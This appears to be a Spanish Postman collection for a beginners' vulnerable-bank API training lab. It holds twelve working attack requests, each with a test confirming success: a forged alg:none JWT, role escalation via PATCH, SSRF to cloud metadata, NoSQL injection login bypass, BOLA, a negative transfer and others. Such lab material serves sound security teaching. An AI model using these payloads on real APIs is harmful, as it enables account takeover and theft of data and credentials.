@@ -1,0 +1,511 @@
+{
+  "info": {
+    "name": "VulnBank API (vulnerable · ATAQUES)",
+    "description": "Los 12 ataques de la \"Guía para principiantes · Atacar una API vulnerable usando Postman\". Entorno de entrenamiento; datos ficticios. Cada prueba confirma que el ataque FUNCIONA.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "api",
+      "value": "https://yellow-ground-024d78310.6.azurestaticapps.net/api/lab"
+    },
+    {
+      "key": "token",
+      "value": ""
+    }
+  ],
+  "item": [
+    {
+      "name": "0 · Iniciar sesión (Laura)",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "const t = pm.response.json().token;",
+              "if (t) { pm.collectionVariables.set(\"token\", t); if (pm.environment.name) pm.environment.set(\"token\", t); }",
+              "pm.test(\"Tengo pulsera\", () => pm.expect(pm.response.json().token).to.be.a(\"string\"));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "POST",
+        "header": [],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"username\": \"laura\",\n  \"password\": \"Laura2026!\"\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "{{api}}/auth/login",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "auth",
+            "login"
+          ]
+        }
+      }
+    },
+    {
+      "name": "1 · Ver la cuenta de Carlos (BOLA)",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test(\"Veo datos de Carlos\", () => pm.expect(pm.response.text()).to.include(\"Carlos\"));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "X-Auth-Token",
+            "value": "{{token}}"
+          }
+        ],
+        "url": {
+          "raw": "{{api}}/accounts/5002",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "accounts",
+            "5002"
+          ]
+        }
+      }
+    },
+    {
+      "name": "2 · Pulsera falsa de admin (alg:none)",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test(\"Soy admin sin contraseña\", () => pm.expect(pm.response.json().username).to.eql(\"admin\"));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "X-Auth-Token",
+            "value": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjEwMDN9."
+          }
+        ],
+        "url": {
+          "raw": "{{api}}/users/me",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "users",
+            "me"
+          ]
+        }
+      }
+    },
+    {
+      "name": "3 · Login: ver que el usuario existe",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test(\"Revela que carlos existe\", () => pm.expect(pm.response.text()).to.include(\"incorrecta\"));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "POST",
+        "header": [],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"username\": \"carlos\",\n  \"password\": \"x\"\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "{{api}}/auth/login",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "auth",
+            "login"
+          ]
+        }
+      }
+    },
+    {
+      "name": "4 · Datos privados de más",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test(\"Expone DNI/PIN\", () => pm.expect(pm.response.text()).to.match(/\"dni\"|\"pin\"/));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "X-Auth-Token",
+            "value": "{{token}}"
+          }
+        ],
+        "url": {
+          "raw": "{{api}}/users/me",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "users",
+            "me"
+          ]
+        }
+      }
+    },
+    {
+      "name": "5 · Ascenderme a admin",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test(\"Ahora soy admin\", () => pm.expect(pm.response.json().role).to.eql(\"admin\"));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "PATCH",
+        "header": [
+          {
+            "key": "X-Auth-Token",
+            "value": "{{token}}"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"role\": \"admin\"\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "{{api}}/users/me",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "users",
+            "me"
+          ]
+        }
+      }
+    },
+    {
+      "name": "6 · Panel de admin siendo cliente",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test(\"Veo todos los usuarios\", () => pm.expect(pm.response.code).to.eql(200));",
+              "pm.sendRequest({url: pm.variables.replaceIn(\"{{api}}/reset\"), method: \"POST\"}, ()=>{});"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "X-Auth-Token",
+            "value": "{{token}}"
+          }
+        ],
+        "url": {
+          "raw": "{{api}}/admin/users",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "admin",
+            "users"
+          ]
+        }
+      }
+    },
+    {
+      "name": "7 · Transferencia negativa",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test(\"Me sube el saldo\", () => pm.expect(pm.response.json().from.balance).to.be.above(2450.75));",
+              "pm.sendRequest({url: pm.variables.replaceIn(\"{{api}}/reset\"), method: \"POST\"}, ()=>{});"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "X-Auth-Token",
+            "value": "{{token}}"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"fromAccountId\": 5001,\n  \"toAccountId\": 5002,\n  \"amount\": -1000\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "{{api}}/transfers",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "transfers"
+          ]
+        }
+      }
+    },
+    {
+      "name": "8 · SSRF a metadatos (simulado)",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test(\"Saco claves de la nube\", () => pm.expect(pm.response.text()).to.include(\"secretAccessKey\"));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "X-Auth-Token",
+            "value": "{{token}}"
+          }
+        ],
+        "url": {
+          "raw": "{{api}}/tools/preview?url=http://169.254.169.254/latest/meta-data/",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "tools",
+            "preview"
+          ],
+          "query": [
+            {
+              "key": "url",
+              "value": "http://169.254.169.254/latest/meta-data/"
+            }
+          ]
+        }
+      }
+    },
+    {
+      "name": "9 · Puerta /debug olvidada (sin pulsera)",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test(\"Expone el secreto de firma\", () => pm.expect(pm.response.text()).to.include(\"jwtSecret\"));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "{{api}}/debug",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "debug"
+          ]
+        }
+      }
+    },
+    {
+      "name": "10 · API antigua v1 (sin pulsera)",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test(\"Datos de Carlos sin login\", () => pm.expect(pm.response.text()).to.include(\"dni\"));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "{{api}}/v1/users/1002",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "v1",
+            "users",
+            "1002"
+          ]
+        }
+      }
+    },
+    {
+      "name": "11 · Inyección NoSQL en el login",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test(\"Entro sin contraseña\", () => pm.expect(pm.response.json().token).to.be.a(\"string\"));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "POST",
+        "header": [],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"username\": \"admin\",\n  \"password\": {\n    \"$ne\": \"\"\n  }\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "{{api}}/auth/login",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "auth",
+            "login"
+          ]
+        }
+      }
+    },
+    {
+      "name": "12 · Pedir 20000 movimientos",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test(\"Devuelve 20000 registros\", () => pm.expect(pm.response.json().items.length).to.eql(20000));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "X-Auth-Token",
+            "value": "{{token}}"
+          }
+        ],
+        "url": {
+          "raw": "{{api}}/accounts/5001/transactions?limit=20000",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "accounts",
+            "5001",
+            "transactions"
+          ],
+          "query": [
+            {
+              "key": "limit",
+              "value": "20000"
+            }
+          ]
+        }
+      }
+    },
+    {
+      "name": "Para terminar · Restaurar datos",
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test(\"Restaurado\", () => pm.expect(pm.response.code).to.eql(200));"
+            ]
+          }
+        }
+      ],
+      "request": {
+        "method": "POST",
+        "header": [],
+        "url": {
+          "raw": "{{api}}/reset",
+          "host": [
+            "{{api}}"
+          ],
+          "path": [
+            "reset"
+          ]
+        }
+      }
+    }
+  ]
+}
